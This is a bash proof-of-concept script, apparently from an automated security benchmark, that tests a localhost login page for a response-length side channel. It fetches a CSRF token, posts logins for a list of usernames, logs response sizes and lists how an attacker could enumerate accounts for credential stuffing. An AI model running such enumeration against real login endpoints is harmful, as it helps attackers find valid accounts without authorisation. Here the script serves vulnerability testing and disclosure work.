#!/bin/bash
# POC: Demonstrates response length side-channel vulnerability for credential enumeration by measuring HTTP response sizes for different username lengths during login attempts
# Target: ./repo
# Created: 2025-11-04T17:16:23.171Z
# Session: benchmark-XBEN-025-24-mhktlvhv

# Response Length Side-Channel Credential Enumeration POC
# This script measures HTTP response sizes for different username lengths
# to demonstrate the side-channel vulnerability in the login endpoint

TARGET_URL="http://localhost/accounts/login/"
PASSWORD="x"
OUTPUT_FILE="response_analysis.txt"

echo "========================================="
echo "Response Length Side-Channel Analysis POC"
echo "========================================="
echo ""

# First, get a valid CSRF token
echo "[*] Fetching CSRF token from login page..."
CSRF_RESPONSE=$(curl -s "$TARGET_URL")
CSRF_TOKEN=$(echo "$CSRF_RESPONSE" | grep -oP 'csrfmiddlewaretoken["\s]*value="\K[^"]+' | head -1)

if [ -z "$CSRF_TOKEN" ]; then
    echo "[-] Failed to extract CSRF token"
    exit 1
fi

echo "[+] CSRF token obtained: ${CSRF_TOKEN:0:10}..."
echo ""

# Clear output file
> "$OUTPUT_FILE"

# Test with various username lengths
declare -a USERNAMES=("a" "ab" "abc" "abcd" "admin" "test" "testuser" "testuser123" "test@example.com" "verylongusernamefortest" "thisusernameisextremelylong1234567890")

echo "[*] Testing username length correlation with response size..."
echo ""

for username in "${USERNAMES[@]}"; do
    # Make POST request with the username
    RESPONSE=$(curl -s -X POST "$TARGET_URL" \
        -d "csrfmiddlewaretoken=$CSRF_TOKEN&username=$username&password=$PASSWORD" \
        -w "\n%{size_download}")
    
    # Extract response size (last line after %{size_download})
    RESPONSE_SIZE=$(echo "$RESPONSE" | tail -n 1)
    USERNAME_LENGTH=${#username}
    
    # Log the result
    LOG_LINE="Username length: $USERNAME_LENGTH chars | Response size: $RESPONSE_SIZE bytes | Username: '$username'"
    echo "$LOG_LINE"
    echo "$LOG_LINE" >> "$OUTPUT_FILE"
done

echo ""
echo "[+] Response analysis complete. Results saved to: $OUTPUT_FILE"
echo ""

# Analyze the correlation
echo "[*] Analyzing correlation between username length and response size..."
echo ""

# Sort by username length and display correlation
echo "Correlation Analysis:"
echo "===================="
sort -t'|' -k1 -V "$OUTPUT_FILE" | while read line; do
    echo "$line" | awk -F'|' '{print $1 " => " $2}'
done

echo ""
echo "[+] If response sizes consistently increase with username length,"
echo "    this demonstrates the side-channel vulnerability."
echo ""
echo "[!] An attacker could use this to:"
echo "    1. Test various usernames and measure response sizes"
echo "    2. Identify patterns in valid vs invalid usernames"
echo "    3. Enumerate valid accounts without rate limiting"
echo "    4. Create a targeted attack list for credential stuffing"